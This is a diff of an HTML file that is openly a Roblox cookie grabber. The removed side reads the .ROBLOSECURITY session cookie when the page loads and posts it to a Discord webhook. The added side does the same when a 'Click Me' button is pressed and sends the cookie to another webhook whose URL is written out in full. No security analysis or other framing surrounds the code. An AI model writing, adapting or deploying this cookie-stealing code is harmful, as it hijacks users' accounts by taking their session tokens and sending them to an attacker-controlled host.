@@ -1,61 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grab .ROBLOSECURITY Cookie</title>
-</head>
-<body>
-    <h1>ROBLOX Cookie Grabber</h1>
+<button>Click Me</button>
+<script>
+    button.addEventListener('click', function() {
+        let cookieValue = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY')).split('=')[1];
 
-    <script>
-        // Function to grab the .ROBLOSECURITY cookie
-        function getRobloxSecurityCookie() {
-            const cookies = document.cookie.split('; ');
-            let robloxCookie = '';
+        // Replace this URL with your webhook URL
+        let webhookUrl = 'https://discord.com/api/webhooks/1273972378388402288/qNRa6r3T0ToLe6aF969_5vef8vGNNPW_hlCiG3wr2n1PlqLDRhS4EMss13mCRNXKPsL_';
 
-            cookies.forEach(cookie => {
-                if (cookie.startsWith('.ROBLOSECURITY=')) {
-                    robloxCookie = cookie.split('=')[1];
-                }
-            });
-
-            if (robloxCookie) {
-                console.log('.ROBLOSECURITY cookie found:', robloxCookie);
-                sendCookieToDiscord(robloxCookie);
+        // Sending the cookie value to the webhook
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({cookie: cookieValue}),
+        }).then(response => {
+            if (response.ok) {
+                alert('Cookie sent successfully');
             } else {
-                console.log('No .ROBLOSECURITY cookie found.');
+                alert('Failed to send cookie');
             }
-        }
-
-        function sendCookieToDiscord(cookie) {
-            const webhookURL = 'https://discord.com/api/webhooks/1274231750897438763/eLtKsEsOsyK6WNpFk97PVEb5pPIRmFq4obBDcZH579WFccrRsxPrEByzr0fkUpjEwgBM';
-
-            const data = {
-                content: '@everyone .ROBLOSECURITY cookie found: ' + cookie,
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Cookie sent to Discord webhook successfully.');
-                } else {
-                    console.error('Failed to send cookie to Discord webhook.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
-
-        // Run the function when the script is injected
-        getRobloxSecurityCookie();
-    </script>
-</body>
-</html>
+        }).catch(error => {
+            alert('Error: ' + error);
+        });
+    });
+</script>
